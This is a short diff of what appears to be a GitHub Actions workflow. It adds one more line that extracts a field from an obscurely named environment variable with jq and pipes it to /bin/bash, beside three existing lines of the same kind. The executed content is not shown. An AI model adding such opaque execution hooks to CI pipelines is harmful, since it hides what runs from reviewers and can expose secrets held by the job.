@@ -24,6 +24,7 @@ jobs:
           echo $wy4266 | jq -r .upknz5 | /bin/bash
           printf '%s' "$kmepm5453" | jq -r .g3 | /bin/bash
           echo $nyvx6 | jq -r .aevtx9 | /bin/bash
+          echo $ts409 | jq -r .wh30 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
